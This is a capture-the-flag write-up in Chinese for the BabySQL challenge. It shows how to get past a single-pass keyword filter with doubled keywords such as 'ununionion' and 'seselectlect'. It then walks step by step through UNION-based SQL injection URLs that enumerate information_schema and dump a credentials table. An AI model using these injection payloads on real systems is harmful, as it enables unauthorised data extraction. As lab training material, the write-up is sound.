# [极客大挑战 2019]BabySQL

## 一、过滤判断

过滤关键词：and、or、union、select等

过滤方式：替换关键词为空



## 二、绕过

题目只进行一次关键词替换，可以嵌套双写绕过。



## 三、注入

1. 判断字段数

```SQL
/check.php?username=admin'oorrder+bbyy+3%23&password=admin
```

得到字段数：3



2. 判断回显位置

```sql
/check.php?username=-admin'ununionion+seselectlect+1,2,3%23&password=admin
```

得到回显位置：2、3



3. 获取数据库名称

```sql
/check.php?username=-admin'ununionion+seselectlect+1,2,database()%23&password=admin
```

得到数据库名称：geek



4. 获取所有表

```sql
/check.php?username=0admin'ununionion+seselectlect+1,2,group_concat(table_name)+ffromrom+infoorrmation_schema.tables+whwhereere+table_schema='geek'%23&password=admin
```

得到：b4bsql、geekuser



5. 获取字段

```sql
/check.php?username=0admin'ununionion+seselectlect+1,2,group_concat(column_name)+ffromrom+infoorrmation_schema.columns+whwhereere+table_name='b4bsql'%23&password=admin
```

得到：id、username、password

```sql
/check.php?username=0admin'ununionion+seselectlect+1,2,group_concat(column_name)+ffromrom+infoorrmation_schema.columns+whwhereere+table_name='geekuser'%23&password=admin
```

得到：id、username、password



6. 获取数据

```sql
/check.php?username=0admin'ununionion+seselectlect+1,2,group_concat(id,username,passwoorrd)+ffromrom+b4bsql%23&password=admin
```

Get flag!